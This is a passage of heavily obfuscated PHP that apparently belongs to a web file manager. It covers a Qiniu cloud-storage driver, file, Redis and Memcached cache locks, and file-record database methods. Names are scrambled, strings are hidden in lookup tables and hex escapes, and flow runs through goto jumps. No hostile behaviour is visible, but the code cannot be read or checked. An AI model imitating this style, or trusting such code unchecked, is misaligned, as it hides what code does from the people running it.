check_abort(); list($—ğñïÉ·, $„ ŠÊò) = $this->bucketManager->listFiles($this->bucket, $Åø § ê, $€°øé„‚, $ÍƒÃèì, $Û¬è—³ù); if ($„ ŠÊò) { break; } $€°øé„‚ = array_key_exists($¢ë¤ùÙ÷[1395], $—ğñïÉ·) ? $€°øé„‚ = $—ğñïÉ·[$¢ë¤ùÙ÷[1428]] : $¢ë¤ùÙ÷[12]; $î±Íöı‚ = isset($—ğñïÉ·[$¢ë¤ùÙ÷[1429]]) ? $—ğñïÉ·[$¢ë¤ùÙ÷[1429]] : array(); $ùê—ŠÚÙ = isset($—ğñïÉ·[$¢ë¤ùÙ÷[1430]]) ? $—ğñïÉ·[$¢ë¤ùÙ÷[1430]] : array(); foreach ($î±Íöı‚ as $Å€Ë¢¶İ) { if ($Å€Ë¢¶İ[$¢ë¤ùÙ÷[104]] == $Åø § ê) { continue; } $µ„†£æ = $Å€Ë¢¶İ[$¢ë¤ùÙ÷[104]]; $äµµÄ  = $Å€Ë¢¶İ[$¢ë¤ùÙ÷[1426]]; $Å€Ë¢¶İ[$¢ë¤ùÙ÷[86]] = $äµµÄ ; $Ö®…åÌı = $äµµÄ  == 0 && substr($µ„†£æ, strlen($µ„†£æ) - 1, 1) == $¢ë¤ùÙ÷[8] ? !0 : !1; $this->cacheMethodInfoSet($µ„†£æ, $Ö®…åÌı, $Å€Ë¢¶İ); if ($Ö®…åÌı) { $ºÚÀö®[] = $µ„†£æ; continue; } $àÏäû§Ç[] = $¹Ğ„Úùú ? $Å€Ë¢¶İ : $µ„†£æ; } foreach ($ùê—ŠÚÙ as $µ„†£æ) { if ($µ„†£æ == $Åø § ê) { continue; } $ºÚÀö®[] = $µ„†£æ; $this->cacheMethodInfoSet($µ„†£æ, !0); } if ($€°øé„‚ === $¢ë¤ùÙ÷[12]) { break; } } $this->cacheMethodInfoSet($¤ñûÃà³, !0); return array($¢ë¤ùÙ÷[92] => $ºÚÀö®, $¢ë¤ùÙ÷[93] => $àÏäû§Ç); } public function canRead($«ğèî‚ƒ) { return $this->exist($«ğèî‚ƒ) ? !0 : !1; } public function canWrite($ºùÊº¦ñ) { return $this->exist($ºùÊº¦ñ) ? !0 : !1; } public function getContent($ıÚ”ş ) { return $this->fileSubstr($ıÚ”ş , 0, -1); } public function setContent($ÏïïÖÍ, $áËéø› = '') { $‘±ğ¾ = $this->tempFile($this->pathThis($ÏïïÖÍ)); file_put_contents($‘±ğ¾, $áËéø›); if ($this->upload($ÏïïÖÍ, $‘±ğ¾)) { $this->tempFileRemve($‘±ğ¾); return !0; } return !1; } public function refreshUrls($ëü¥¸¦) { $åµèÏ£ =& $_SERVER[„Ç©ñÎ©]; $¯’ÀüáÉ = array(); if (is_array($ëü¥¸¦)) { foreach ($ëü¥¸¦ as $‚œÆŸ·â) { $¯’ÀüáÉ[] = $this->link($‚œÆŸ·â); } } else { $¯’ÀüáÉ[] = $this->link($ëü¥¸¦); } $‚ÆÎÎ = new Qiniu\Cdn\CdnManager($this->auth); list($òø…£óÙ, $Ïú”®ÚÂ) = $‚ÆÎÎ->refreshUrls($¯’ÀüáÉ); if ($Ïú”®ÚÂ) { return !1; } return $òø…£óÙ[$åµèÏ£[1182]] == $åµèÏ£[763] ? !0 : !1; } public function fileSubstr($ºÛ‚ƒóé, $Èİøˆ¹ö, $Ò“ªîÔ) { $ë”‚Á¥ =& $_SERVER[„Ç©ñÎ©]; if (!($ ôÕšä¾ = $this->link($ºÛ‚ƒóé))) { return !1; } $Ê…„Çø = !1; if ($Ò“ªîÔ > 0) { $ä×º£¾„ = $Èİøˆ¹ö + $Ò“ªîÔ - 1; $Ê…„Çø = array($ë”‚Á¥[1431] . $Èİøˆ¹ö . $ë”‚Á¥[395] . $ä×º£¾„); } $ğâÈ•üÖ = url_request($ ôÕšä¾, $ë”‚Á¥[240], !1, $Ê…„Çø); return $ğâÈ•üÖ[$ë”‚Á¥[753]] ? $ğâÈ•üÖ[$ë”‚Á¥[1192]] : !1; } public function upload($ç ˆµ£ä, $‡‹÷ëğ, $ç¦ÁËŸ¯ = false, $›˜ÛÊÁ¢ = REPEAT_REPLACE) { $‘•…ğ¼ = new Qiniu\Storage\UploadManager(); $·‰ıÒ·£ = $this->auth->uploadToken($this->bucket, $ç ˆµ£ä); $–ÓßæÄ¿ = get_file_mime(get_path_ext($‡‹÷ëğ)); list($¶Ã÷¶†, $ƒ¶Ò«¯à) = $‘•…ğ¼->putFile($·‰ıÒ·£, $ç ˆµ£ä, $‡‹÷ëğ, null, $–ÓßæÄ¿); return $ƒ¶Ò«¯à ? !1 : $this->getPathOuter($ç ˆµ£ä); } public function uploadFormData($ºí²æÆ, $Ö‚…¨ûì = 3600) { return $this->uploadToken($ºí²æÆ, $Ö‚…¨ûì); } public function multiUploadFormData($’å×ıÊ­, $‚ïáá¡¼ = 3600) { return $this->uploadToken($’å×ıÊ­, $‚ïáá¡¼); } private function uploadToken($´ß†ìœ, $°½µ÷Ñ‘ = 3600) { $–¨ÕÇ¹ =& $_SERVER[„Ç©ñÎ©]; $Êƒºö ô = $°½µ÷Ñ‘; $¥Ö©÷Îƒ = array($–¨ÕÇ¹[1432] => $–¨ÕÇ¹[1433]); $ß¦úê¶ç = $´ß†ìœ; $Àƒ¬ıß = $this->auth->uploadToken($this->bucket, $ß¦úê¶ç, $Êƒºö ô, $¥Ö©÷Îƒ, !0); $ –¥ãÑ = empty($this->region) || $this->region == $–¨ÕÇ¹[1434] ? $–¨ÕÇ¹[12] : $–¨ÕÇ¹[395] . $this->region; $øÂÜä×” = http_type() . "\72\57\x2f\165\160\x6c\157\141\144{$ –¥ãÑ}\x2e\x71\x69\156\151\165\x70\56\143\157\155\57"; return array($–¨ÕÇ¹[1435] => $Àƒ¬ıß, $–¨ÕÇ¹[1436] => $øÂÜä×”); } public function download($Ññã”µ , $Í®¾Üàˆ) { $¼Ù†Ú‰¼ = IO::getPathInner(IO::mkfile($Í®¾Üàˆ)); if (!($«ßÈ³Åë = $this->link($Ññã”µ ))) { return !1; } $ñÁùøÜÑ = 0; $Ù÷é¥°¹ = 1024 * 200; $Áìó›„ = fopen($¼Ù†Ú‰¼, $_SERVER[„Ç©ñÎ©][1437]); while (!0) { $§†”û‚± = $this->fileSubstr($Ññã”µ , $ñÁùøÜÑ, $Ù÷é¥°¹); if ($§†”û‚± === !1) { return !1; } fwrite($Áìó›„, $§†”û‚±); $ñÁùøÜÑ += $Ù÷é¥°¹; if (strlen($§†”û‚±) < $Ù÷é¥°¹) { break; } } fclose($Áìó›„); return $Í®¾Üàˆ; } public function link($ç´¨ŠÔå, $¤£ª÷Şø = '') { if (!$this->isFile($ç´¨ŠÔå)) { return !1; } $„ñÁ¾© = $this->getHost() . $_SERVER[„Ç©ñÎ©][8] . $this->pathEncode($ç´¨ŠÔå) . $¤£ª÷Şø; return $this->auth->privateDownloadUrl($„ñÁ¾©, 3600 * 12); } public function fileOut($¯îÍ²Ô˜, $ªÆÕ˜ë = false, $Ê‚·µÍ» = false, $şßò±®¾ = '') { $Î‰±¯ü =& $_SERVER[„Ç©ñÎ©]; if ($this->isFileOutServer()) { return $this->fileOutServer($¯îÍ²Ô˜, $ªÆÕ˜ë, $Ê‚·µÍ», $şßò±®¾); } if (!$Ê‚·µÍ») { $Ê‚·µÍ» = $this->pathThis($¯îÍ²Ô˜); } $½¹ıƒÖú = $ªÆÕ˜ë ? $Î‰±¯ü[1438] . rawurlencode($Ê‚·µÍ») : $Î‰±¯ü[12]; $¿‘¥ùØó = $this->link($¯îÍ²Ô˜, $½¹ıƒÖú); $this->fileOutLink($¿‘¥ùØó); } public function fileOutServer($ì¥ù¼ğ©, $å¸òá› = false, $»ì¢¿¤’ = false, $½¼’˜ìÚ = '') { parent::fileOut($ì¥ù¼ğ©, $å¸òá›, $»ì¢¿¤’, $½¼’˜ìÚ); } public function fileOutImage($ı¿¸šªÔ, $ûûÂÛÈÒ = 250) { $†˜ñî‘Œ = $this->link($ı¿¸šªÔ, $_SERVER[„Ç©ñÎ©][1439] . $ûûÂÛÈÒ); $this->fileOutLink($†˜ñî‘Œ); } public function fileOutImageServer($óÂÈ, $ÆÓ²İİ· = 250) { parent::fileOutImage($óÂÈ, $ÆÓ²İİ·); } public function hashMd5($ÀÚ‹¹Ë) { $É°è®İ² =& $_SERVER[„Ç©ñÎ©]; $Ëò‘åÙâ = $this->objectMeta($ÀÚ‹¹Ë); return isset($Ëò‘åÙâ[$É°è®İ²[222]]) ? $Ëò‘åÙâ[$É°è®İ²[222]] : !1; $öÚË­Õ = $this->link($ÀÚ‹¹Ë, $É°è®İ²[1440]); } public function size($ßğÕµ¸Ó) { $¸ÅĞÂù = $this->objectMeta($ßğÕµ¸Ó); return $¸ÅĞÂù ? $¸ÅĞÂù[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function info($ÆÍ»—¼) { if ($this->isFolder($ÆÍ»—¼)) { return $this->folderInfo($ÆÍ»—¼); } else { if ($this->isFile($ÆÍ»—¼)) { return $this->fileInfo($ÆÍ»—¼); } } return !1; } public function exist($âéÓş„¸) { return $this->isFile($âéÓş„¸) || $this->isFolder($âéÓş„¸); } public function isFile($ÔÃË®É) { return !$this->isFolder($ÔÃË®É) && $this->objectMeta($ÔÃË®É); } public function isFolder($äû©ØÚÍ) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][175], $äû©ØÚÍ); } protected function objectMeta($×Ùâ·’Ø) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][177], $×Ùâ·’Ø); } protected function _objectMeta($Ã»åŸí™) { $ö÷şÔ²£ =& $_SERVER[„Ç©ñÎ©]; list($£äã¶ë, $Çï×ÌÙó) = $this->bucketManager->stat($this->bucket, $Ã»åŸí™); if ($£äã¶ë) { $£äã¶ë[$ö÷şÔ²£[86]] = intval($£äã¶ë[$ö÷şÔ²£[1426]]); } return $£äã¶ë; } protected function _isFolder($œ±¥Ğ‰ğ) { $û“üü =& $_SERVER[„Ç©ñÎ©]; if ($œ±¥Ğ‰ğ == $û“üü[12] || $œ±¥Ğ‰ğ == $û“üü[8]) { return !0; } list($ïÄÑ¿, $ôê…¯ÂÁ) = $this->bucketManager->listFiles($this->bucket, trim($œ±¥Ğ‰ğ, $û“üü[8]) . $û“üü[8], $û“üü[12], 1, $û“üü[8]); return !empty($ïÄÑ¿[$û“üü[1429]]) || !empty($ïÄÑ¿[$û“üü[1430]]) ? !0 : !1; } } goto DâôÌÔ®Î; a—ÉÛô¾Æ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $·ç™—Êé =& $_SERVER[„Ç©ñÎ©]; $àÆ®ç°Ê = $GLOBALS[$·ç™—Êé[6]][$·ç™—Êé[358]]; self::$cachePath = $àÆ®ç°Ê[$·ç™—Êé[209]][$·ç™—Êé[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÙìØ©îš, $ØŸ¢Ûƒ = 0) { $‘ç¸ïš =& $_SERVER[„Ç©ñÎ©]; $Ü«‰®öÀ = microtime(!0); $Ö–çå = $Ü«‰®öÀ + $ØŸ¢Ûƒ + 0.0001; $Òı’ÑúŒ = rtrim(self::$cachePath, $‘ç¸ïš[8]) . $‘ç¸ïš[862] . md5($ÙìØ©îš) . $‘ç¸ïš[859]; if (file_exists($Òı’ÑúŒ) && filemtime($Òı’ÑúŒ) && filemtime($Òı’ÑúŒ) < time() - 10) { @unlink($Òı’ÑúŒ); } do { if (file_exists($Òı’ÑúŒ)) { cacheLockWait(); continue; } $®¿¿÷¡ì = fopen($Òı’ÑúŒ, $‘ç¸ïš[863]); if (!$®¿¿÷¡ì) { return !1; } $±ë¨öÚ = flock($®¿¿÷¡ì, LOCK_EX | LOCK_NB); self::$caches[$ÙìØ©îš] = array($‘ç¸ïš[864] => $®¿¿÷¡ì, $‘ç¸ïš[209] => $Òı’ÑúŒ); fwrite($®¿¿÷¡ì, $Ö–çå); clearstatcache(); if ($®¿¿÷¡ì && $±ë¨öÚ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ö–çå); $this->unlock($ÙìØ©îš); return !1; } public function lockGet($©¬³±Š) { $¤ªøÜÒ¤ =& $_SERVER[„Ç©ñÎ©]; $ã§õæ³€ = rtrim(self::$cachePath, $¤ªøÜÒ¤[8]) . $¤ªøÜÒ¤[862] . md5($©¬³±Š) . $¤ªøÜÒ¤[859]; return file_exists($ã§õæ³€); } public function unlock($ü İıÁ–) { $¸ĞÏ¼Üü =& $_SERVER[„Ç©ñÎ©]; $ƒÅ¢²Ğ = self::$caches[$ü İıÁ–]; if (!$ƒÅ¢²Ğ) { return; } @flock($ƒÅ¢²Ğ[$¸ĞÏ¼Üü[864]], LOCK_UN); @fclose($ƒÅ¢²Ğ[$¸ĞÏ¼Üü[864]]); @unlink($ƒÅ¢²Ğ[$¸ĞÏ¼Üü[209]]); unset(self::$caches[$ü İıÁ–]); } } class CacheLockRedis { public function lock($ãşûùæ³, $‘È®¨Ôö = 10) { $¸Ôàëşú = Cache::init(); $†óë… = microtime(!0) + $‘È®¨Ôö; while (microtime(!0) < $†óë…) { $†¦šÌŒº = $¸Ôàëşú->get($ãşûùæ³); if (!$†¦šÌŒº) { $Ô’‹œÊ¨ = $¸Ôàëşú->setLock($ãşûùæ³, $†óë…, $‘È®¨Ôö); if ($Ô’‹œÊ¨) { return !0; } } else { if ($†¦šÌŒº < microtime(!0)) { $¸Ôàëşú->set($ãşûùæ³, $†óë…, $‘È®¨Ôö * 2); if ($¸Ôàëşú->get($ãşûùæ³) === $†¦šÌŒº) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($„©£Ê„ï) { return Cache::init()->get($„©£Ê„ï); } public function unlock($ºÂçğµ») { return Cache::init()->remove($ºÂçğµ»); } } class CacheLockMemcached { public function lock($ìî±‡³ø, $†Â£ñ˜É = 0) { $ğ¿ñê”Ğ = Cache::init(); $æ±™¯Ìé = microtime(!0) + $†Â£ñ˜É; while (microtime(!0) < $æ±™¯Ìé) { $åºæ³Óø = $ğ¿ñê”Ğ->get($ìî±‡³ø); if (!$åºæ³Óø || $åºæ³Óø < microtime(!0)) { $ºòùÀ±Ç = $ğ¿ñê”Ğ->handle->add($ìî±‡³ø, $æ±™¯Ìé, $†Â£ñ˜É); if ($ºòùÀ±Ç) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜™Ÿ¶å¤) { return Cache::init()->get($˜™Ÿ¶å¤); } public function unlock($äû¯Ç¡Ç) { return Cache::init()->remove($äû¯Ç¡Ç); } } goto FÖÂˆìñõ; Cäİß°‘¬½: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\x65\137\143\157\156\164\145\x6e\x74\163"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\x63\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\145"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\151\157\x5f\146\x69\x6c\x65\137\155\x65\x74\x61", "\155\145\164\141\x46\151\x65\x6c\144" => "\x66\151\154\x65\111\x44"); public function fileInfo($ÖÛ‰«Ä‹) { $Ù¶Âˆ®ù =& $_SERVER[„Ç©ñÎ©]; static $Áã¸¨—“ = array(); if (!isset($Áã¸¨—“[$ÖÛ‰«Ä‹])) { $¶ºßßíº = $Ù¶Âˆ®ù[1876]; $½‰Î½£ = Model($Ù¶Âˆ®ù[480])->field($¶ºßßíº)->where(array($Ù¶Âˆ®ù[478] => $ÖÛ‰«Ä‹))->find(); $Áã¸¨—“[$ÖÛ‰«Ä‹] = $½‰Î½£; } return $Áã¸¨—“[$ÖÛ‰«Ä‹]; } public function addFileByContent($çİÃÙ¦™ = '', $ßåÈŒˆ– = '') { $‡òÃ¬¶œ =& $_SERVER[„Ç©ñÎ©]; $ïÄşâ° = TEMP_PATH . $‡òÃ¬¶œ[1877]; if (!is_dir($ïÄşâ°)) { mk_dir($ïÄşâ°); } $×¾“­Ã’ = $ïÄşâ° . $‡òÃ¬¶œ[1878] . rand_string(16); file_put_contents($×¾“­Ã’, $çİÃÙ¦™); $æĞ¨·İæ = $this->addFile($×¾“­Ã’, $ßåÈŒˆ–, !0); if (file_exists($×¾“­Ã’)) { @unlink($×¾“­Ã’); } return $æĞ¨·İæ; } public function createFileName($æŞ—½èª, $ëş®éÉË = false, $ÛºòçÀœ = false) { $¦ÄÙ¿»Ñ =& $_SERVER[„Ç©ñÎ©]; $¡ƒ…‹Ì = IO::init($¦ÄÙ¿»Ñ[8]); $ÀÓÓ×¹µ = $this->makeFilePath($æŞ—½èª, $¡ƒ…‹Ì, $ëş®éÉË, $ÛºòçÀœ); $Ç…½èĞµ = $¡ƒ…‹Ì->pathFather($ÀÓÓ×¹µ); static $Ø«³­”´ = false; $Â±ŠŸáÁ = $¦ÄÙ¿»Ñ[1879] . md5($Ç…½èĞµ); if (!$Ø«³­”´ && !Cache::get($Â±ŠŸáÁ)) { $Ø«³­”´ = !0; $ô„ÏúØ‚ = IO::mkdir($Ç…½èĞµ); if (!IO::exist($ô„ÏúØ‚ . $¦ÄÙ¿»Ñ[800])) { IO::mkfile($ô„ÏúØ‚ . $¦ÄÙ¿»Ñ[800]); } Cache::set($Â±ŠŸáÁ, 1, 3600 * 2); } return $ÀÓÓ×¹µ; } public function makeFilePath($‰©„½ïú, $Î®‡ ÌÃ, $–çÏ¦Ş = false, $ÊÚÜ³ = false) { $§ıôŸ«­ =& $_SERVER[„Ç©ñÎ©]; $¦³’ß©ç = Model($§ıôŸ«­[773])->get($§ıôŸ«­[1880]); $–éÌÔû = KodIO::defaultIO() . date($§ıôŸ«­[1881]); $¬Æ€™¨ = $–éÌÔû . rand_string(5) . short_id(100); $‰©„½ïú = str_replace($§ıôŸ«­[8], $§ıôŸ«­[11], KodIO::clear($‰©„½ïú)); $¢ÈÎÎ—İ = $Î®‡ ÌÃ->ext($‰©„½ïú); if (!$‰©„½ïú) { $¦³’ß©ç = $§ıôŸ«­[1882]; } switch ($¦³’ß©ç) { case $§ıôŸ«­[1883]: $¬Æ€™¨ = $¬Æ€™¨ . $§ıôŸ«­[10] . $Î®‡ ÌÃ->ext($‰©„½ïú); if ($¢ÈÎÎ—İ == $§ıôŸ«­[1820]) { $¬Æ€™¨ .= $§ıôŸ«­[1550]; } break; case $§ıôŸ«­[1884]: $“Ê„ÙÙ´ = Model($§ıôŸ«­[773])->get($§ıôŸ«­[774]); $õİ¥Ãüğ = substr(md5($§ıôŸ«­[775] . $“Ê„ÙÙ´ . date($§ıôŸ«­[751])), 0, 8); $§ññ²ÖÑ = KodIO::defaultDriver(); $–éÌÔû = $§ıôŸ«­[1228] . $§ññ²ÖÑ[$§ıôŸ«­[408]] . $§ıôŸ«­[418] . date($§ıôŸ«­[1885]) . $õİ¥Ãüğ . $§ıôŸ«­[8]; if ($¢ÈÎÎ—İ == $§ıôŸ«­[1820]) { $‰©„½ïú .= $§ıôŸ«­[1550]; } $„‰ó›• = $§ıôŸ«­[1886] . $–éÌÔû . $‰©„½ïú; CacheLock::lock($„‰ó›•); $¬Æ€™¨ = $–éÌÔû . $‰©„½ïú; if (IO::exist($–éÌÔû . $‰©„½ïú)) { $œ‘´õê = substr($‰©„½ïú, 0, strlen($‰©„½ïú) - strlen($¢ÈÎÎ—İ)); $–ÙŸ±ÓÂ = $ÊÚÜ³ ? substr($ÊÚÜ³, 0, 5) : ($–çÏ¦Ş ? substr($–çÏ¦Ş, 0, 5) : rand_string(5)); $¬Æ€™¨ = $–éÌÔû . $œ‘´õê . $–ÙŸ±ÓÂ . $§ıôŸ«­[10] . $¢ÈÎÎ—İ; } if (IO::isTypeObject($¬Æ€™¨) && !IO::isUploadServer($¬Æ€™¨)) { if (IO::exist($¬Æ€™¨)) { return $¬Æ€™¨; } $í¥¤©úÏ = IO::setContent($¬Æ€™¨, $§ıôŸ«­[12]); if (!$í¥¤©úÏ) { show_json($§ıôŸ«­[1887], !1); } } CacheLock::unlock($„‰ó›•); break; case $§ıôŸ«­[1882]: break; default: break; } return $¬Æ€™¨; } public function addFileByRemote($“ØÓ°ó, $©œ‹üËë, $é©×¶± = array()) { $±‚‹…õÊ =& $_SERVER[„Ç©ñÎ©]; if (!IO::exist($“ØÓ°ó)) { return !1; } $Å­¹ˆ = $é©×¶±[$±‚‹…õÊ[186]] ? $é©×¶±[$±‚‹…õÊ[186]] : $±‚‹…õÊ[12]; $ù£Äù×¿ = IO::hashMd5($“ØÓ°ó, $Å­¹ˆ); $ú†Â‰¼™ = KodIO::defaultDriver(); $ŸŞİÑ˜ì = array($±‚‹…õÊ[594] => IO::size($“ØÓ°ó), $±‚‹…õÊ[1888] => 1, $±‚‹…õÊ[429] => $©œ‹üËë, $±‚‹…õÊ[811] => $ú†Â‰¼™[$±‚‹…õÊ[408]], $±‚‹…õÊ[430] => $“ØÓ°ó, $±‚‹…õÊ[1889] => $é©×¶±[$±‚‹…õÊ[187]] ? $é©×¶±[$±‚‹…õÊ[187]] : IO::hashSimple($“ØÓ°ó), $±‚‹…õÊ[1890] => $ù£Äù×¿ ? $ù£Äù×¿ : $Å­¹ˆ); if ($¦¹ûäÙ = $this->addFileCheckExist($ŸŞİÑ˜ì[$±‚‹…õÊ[187]], $ŸŞİÑ˜ì[$±‚‹…õÊ[186]], $ŸŞİÑ˜ì[$±‚‹…õÊ[86]])) { return $¦¹ûäÙ; } return $this->addFileData($ŸŞİÑ˜ì); } private function addFileData($Â ‹ºïÓ) { $²·Âêñå =& $_SERVER[„Ç©ñÎ©]; if (!$Â ‹ºïÓ) { return !1; } $Â ‹ºïÓ[$²·Âêñå[86]] = intval($Â ‹ºïÓ[$²·Âêñå[86]]); if (!$Â ‹ºïÓ[$²·Âêñå[86]] && strlen($Â ‹ºïÓ[$²·Âêñå[187]]) > 32) { $Â ‹ºïÓ[$²·Âêñå[86]] = intval(substr($Â ‹ºïÓ[$²·Âêñå[187]], 32)); } $ÇÎÊïæÍ = $this->add($Â ‹ºïÓ); return $this->find($ÇÎÊïæÍ); } public function addFile($ÙæìŒ€û, $ŠŸ™İœ², $Ûåó°ï = false) { $‡ Åö‘€ =& $_SERVER[„Ç©ñÎ©]; $Äêûİ¦ = IO::hashSimple($ÙæìŒ€û); $–Èì· = IO::size($ÙæìŒ€û); $ê––ÊœŒ = $–Èì· <= 1024 * 1024 * 10 ? IO::hashMd5($ÙæìŒ€û) : $‡ Åö‘€[12]; $Œö¥Ãıâ = $‡ Åö‘€[1891] . $Äêûİ¦; CacheLock::lock($Œö¥Ãıâ); if ($ê––ÊœŒ && $Äêûİ¦) { $ÈâÇœá = $this->addFileCheckExist($Äêûİ¦, $ê––ÊœŒ, $–Èì·); if ($ÈâÇœá) { CacheLock::unlock($Œö¥Ãıâ); return $ÈâÇœá; } } $ıª¸¼ÎÙ = $this->addFileMake($ÙæìŒ€û, $–Èì·, $Äêûİ¦, $ê––ÊœŒ, $ŠŸ™İœ², $Ûåó°ï); $¥§ÏÀÕŠ = $this->addFileData($ıª¸¼ÎÙ); CacheLock::unlock($Œö¥Ãıâ); if (!$ê––ÊœŒ && $¥§ÏÀÕŠ) { $this->fileMd5Check($¥§ÏÀÕŠ); } return $¥§ÏÀÕŠ; } private function fileMd5Check($ø¼ÕÇØñ) { $¼Ù¡¼¤´ =& $_SERVER[„Ç©ñÎ©]; $üü‘ = array($ø¼ÕÇØñ[$¼Ù¡¼¤´[477]], $ø¼ÕÇØñ[$¼Ù¡¼¤´[94]]); $ñ¡‘¹¹Ê = $¼Ù¡¼¤´[1892] . $ø¼ÕÇØñ[$¼Ù¡¼¤´[94]]; $¥™ÊÀı = $¼Ù¡¼¤´[1893] . $ø¼ÕÇØñ[$¼Ù¡¼¤´[477]]; $Åï–ê°Ù = TaskQueue::add($¼Ù¡¼¤´[1894], $üü‘, $ñ¡‘¹¹Ê, $¥™ÊÀı); if (!$Åï–ê°Ù) { $this->fileMd5Set($ø¼ÕÇØñ[$¼Ù¡¼¤´[477]], $ø¼ÕÇØñ[$¼Ù¡¼¤´[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($”˜Ö”ìÓ, $¸™Õ‚Ä) { $âÛ‘³Ü¦ =& $_SERVER[„Ç©ñÎ©]; $ëªˆé»¡ = $this->find($”˜Ö”ìÓ); if (!$ëªˆé»¡ || $ëªˆé»¡[$âÛ‘³Ü¦[186]]) { return; } $ºåé¹ = IO::hashMd5($¸™Õ‚Ä); if (!$ºåé¹) { return $âÛ‘³Ü¦[12]; } $this->where(array($âÛ‘³Ü¦[477] => $”˜Ö”ìÓ))->save(array($âÛ‘³Ü¦[186] => $ºåé¹)); } public function addFileMake($°ÌÂŒ·¬, $ˆÛ„éŞ, $ „›‹, $óĞ¥…ŒÏ, $ù‰Æº”Û, $¹×øÍî›) { $‘°ƒÀô =& $_SERVER[„Ç©ñÎ©]; $óâÊï² = $this->createFileName($ù‰Æº”Û, $ „›‹, $óĞ¥…ŒÏ); $¦›Ü£¯å = get_path_father($óâÊï²); $ŸŞ»æ«è = get_path_this($óâÊï²); if ($¹×øÍî›) { $¥¨ø«Á’ = IO::move($°ÌÂŒ·¬, $¦›Ü£¯å, !1, $ŸŞ»æ«è); } else { $¥¨ø«Á’ = IO::copy($°ÌÂŒ·¬, $¦›Ü£¯å, !1, $ŸŞ»æ«è); } if (!$¥¨ø«Á’) { return !1; } $ò‘êşºÖ = KodIO::defaultDriver(); $û“ö÷” = array($‘°ƒÀô[594] => $ˆÛ„éŞ, $‘°ƒÀô[1888] => 1, $‘°ƒÀô[429] => $ù‰Æº”Û, $‘°ƒÀô[811] => $ò‘êşºÖ[$‘°ƒÀô[408]], $‘°ƒÀô[430] => $óâÊï², $‘°ƒÀô[1889] => $ „›‹, $‘°ƒÀô[1890] => $óĞ¥…ŒÏ); return $û“ö÷”; } public function addFileCheckExist($¦ö¤ƒŒŞ, $ù†¿ÒâÛ, $û§Ê¬ó¶) { $ğÚ×Õ =& $_SERVER[„Ç©ñÎ©]; $Íš†€Å˜ = $this->findByHash($¦ö¤ƒŒŞ, $ù†¿ÒâÛ); if (!$Íš†€Å˜) { return !1; } $ÌñÏ®ÖÊ = array($ğÚ×Õ[1888] => intval($Íš†€Å˜[$ğÚ×Õ[1895]]) + 1, $ğÚ×Õ[594] => $û§Ê¬ó¶); $this->where(array($ğÚ×Õ[478] => $Íš†€Å˜[$ğÚ×Õ[477]]))->save($ÌñÏ®ÖÊ); return $Íš†€Å˜; } public function remove($šƒ¾±û) { $this->linkCountChange($šƒ¾±û, !1); $this->clearEmpty(); return !0; } public function linkAdd($²ïè„ÊÕ) { $this->linkCountChange($²ïè„ÊÕ, !0); } public function linkCountChange($â¼åı•ä, $Ø°şô†ê) { $–¯ä›¡“ =& $_SERVER[„Ç©ñÎ©]; if (!$â¼åı•ä) { return; } if (!is_array($â¼åı•ä)) { $â¼åı•ä = array($â¼åı•ä); } $İéêĞşÓ = array(); foreach ($â¼åı•ä as $“«¢µº) { $ÚÌòÎ˜ = $“«¢µº . $–¯ä›¡“[12]; if (!$İéêĞşÓ[$ÚÌòÎ˜]) { $İéêĞşÓ[$ÚÌòÎ˜] = 0; } $İéêĞşÓ[$ÚÌòÎ˜]++; } $‰Û•îæ« = array(); foreach ($İéêĞşÓ as $“«¢µº => $­¨ƒü¹Š) { $ÚÌòÎ˜ = $­¨ƒü¹Š . $–¯ä›¡“[12]; if (!$‰Û•îæ«[$ÚÌòÎ˜]) { $‰Û•îæ«[$ÚÌòÎ˜] = array(); } $‰Û•îæ«[$ÚÌòÎ˜][] = $“«¢µº; } foreach ($‰Û•îæ« as $­¨ƒü¹Š => $®ºÍ±º¦) { if (!$®ºÍ±º¦) { continue; } $­¨ƒü¹Š = $Ø°şô†ê ? $­¨ƒü¹Š : -intval($­¨ƒü¹Š); $İ¹æ¯ = array($–¯ä›¡“[477] => array($–¯ä›¡“[7], $®ºÍ±º¦)); if ($­¨ƒü¹Š < 0) { $İ¹æ¯[$–¯ä›¡“[1895]] = array($–¯ä›¡“[1014], abs($­¨ƒü¹Š)); } $this->where($İ¹æ¯)->setAdd($–¯ä›¡“[1895], $­¨ƒü¹Š); } } public function findByHash($œû§ÊÔ°, $çÌ†×›Å = false) { $Úï«Ó–Ô =& $_SERVER[„Ç©ñÎ©]; if (!$œû§ÊÔ° && !$çÌ†×›Å) { return !1; } $ÀüÆ‡¶‚ = array($Úï«Ó–Ô[1889] => $œû§ÊÔ°); if ($çÌ†×›Å) { $ÀüÆ‡¶‚ = array($Úï«Ó–Ô[1890] => $çÌ†×›Å); } return $this->order($Úï«Ó–Ô[1896])->where($ÀüÆ‡¶‚)->find(); } public function clearEmpty($”ÙåÙ’Ù = 0) { $”Ã ©§ç =& $_SERVER[„Ç©ñÎ©]; $ØœÇå†¯ = time() - 3600 * 24 * $”ÙåÙ’Ù; $ù°ƒŸĞª = $”Ã ©§ç[1897] . $ØœÇå†¯; $ÚÌêŒû¶ = $this->where($ù°ƒŸĞª)->select(); if (!$ÚÌêŒû¶) { return; } $ŞÃ™—­¢ = new Task($”Ã ©§ç[1898], $”Ã ©§ç[12], count($ÚÌêŒû¶)); foreach ($ÚÌêŒû¶ as $£ë¤¼¸) { $ŞÃ™—­¢->update(1); $this->resetFile($£ë¤¼¸); } $ŞÃ™—­¢->end(); } public function resetFile($ò‘°ü¹ ) { $ŸÅ·÷É =& $_SERVER[„Ç©ñÎ©]; $‡ğ´ã« = array($ŸÅ·÷É[478] => $ò‘°ü¹ [$ŸÅ·÷É[477]]); $í€×›©é = 